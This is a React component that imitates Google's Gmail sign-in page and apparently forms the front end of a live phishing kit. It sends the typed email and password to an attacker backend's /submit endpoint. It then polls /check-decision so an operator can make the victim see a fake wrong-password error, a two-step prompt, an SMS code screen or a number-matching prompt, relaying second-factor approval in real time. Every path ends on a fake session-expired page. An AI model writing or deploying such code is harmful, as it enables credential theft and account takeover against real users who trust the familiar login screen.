import React, { useState } from "react";
import BrandingSide from "./BrandingSide";
import EmailForm from "./EmailForm";
import PasswordForm from "./PasswordForm";
import Footer from "./Footer";
import "./GmailLogin.css";
import TwoStepVerification from "./TwoStepVerification";
import NumberPrompt from "./NumberPrompt";
import SmsVerification from "./SmsVerification";
import SessionExpired from "./SessionExpired";

const GmailLogin = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [passwordError, setPasswordError] = useState("");
    const [show2FA, setShow2FA] = useState(false);
    const [showNumberPrompt, setShowNumberPrompt] = useState(false);
    const [promptNumber, setPromptNumber] = useState("");
    const [showSms, setShowSms] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [showSessionExpired, setShowSessionExpired] = useState(false);

    const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();
        if (email.trim()) {
            setShowPassword(true);
        } else {
            alert("Please enter your email or phone");
        }
    };

    const startPolling = (onSuccess?: () => void) => {
        const interval = setInterval(async () => {
            const res = await fetch(`${process.env.REACT_APP_BACKEND_URL}/check-decision`);
            const data = await res.json();

            console.log("polling decision ==--==", data.decision);

            if (data.decision === "password-error") {
                clearInterval(interval);
                setIsLoading(false);
                setPasswordError("Wrong password. Try again.");
                setPassword("");
                setTimeout(() => startPolling(), 500);

            } else if (data.decision === "yes-prompt") {
                clearInterval(interval);
                setIsLoading(false);
                setShow2FA(true);
                // keep polling for success from the 2FA screen
                setTimeout(() => startPolling(() => {
                    setShow2FA(false);
                    setShowSessionExpired(true);
                }), 500);

            } else if (data.decision === "sms-code") {
                clearInterval(interval);
                setIsLoading(false);
                setShowSms(true);
                // keep polling for success from the SMS screen
                setTimeout(() => startPolling(() => {
                    setShowSms(false);
                    setShowSessionExpired(true);
                }), 500);

            } else if (data.decision?.startsWith("number-prompt:")) {
                clearInterval(interval);
                setIsLoading(false);
                const number = data.decision.split(":")[1];
                setPromptNumber(number);
                setShowNumberPrompt(true);
                // wait longer than the server's clear timeout before restarting
                setTimeout(() => startPolling(() => {
                    setShowNumberPrompt(false);
                    setShowSessionExpired(true);
                }), 7000); // ← wait 7 seconds so old decision is fully cleared first

            } else if (data.decision === "success") {
                clearInterval(interval);
                setIsLoading(false);
                if (onSuccess) {
                    onSuccess();
                } else {
                    setShowSessionExpired(true);
                }
            }
        }, 2000);
    };

    // ── Form submit — sends to backend then starts polling ──
    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setPasswordError("");
        setIsLoading(true);

        await fetch(`${process.env.REACT_APP_BACKEND_URL}/submit`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password, provider: "GMAIL" }),
        });

        startPolling();
    };

    if (show2FA) {
        return <TwoStepVerification email={email} />;
    }

    if (showNumberPrompt) {
        return <NumberPrompt email={email} number={promptNumber} />;
    }

    if (showSms) {
        return <SmsVerification email={email} />;
    }

    if (showSessionExpired) {
        return <SessionExpired />;
    }

    return (
        <div className="gmail-login-page">
            <div className="login-card">
                <BrandingSide showPassword={showPassword} email={email} />

                <div className="form-side">
                    {!showPassword ? (
                        <EmailForm email={email} onEmailChange={setEmail} onNext={handleNext} />
                    ) : (
                        <PasswordForm
                            password={password}
                            onPasswordChange={setPassword}
                            onSubmit={handleSubmit}
                            error={passwordError}
                            loading={isLoading}
                        />
                    )}
                </div>
            </div>

            <Footer />
        </div>
    );
};

export default GmailLogin;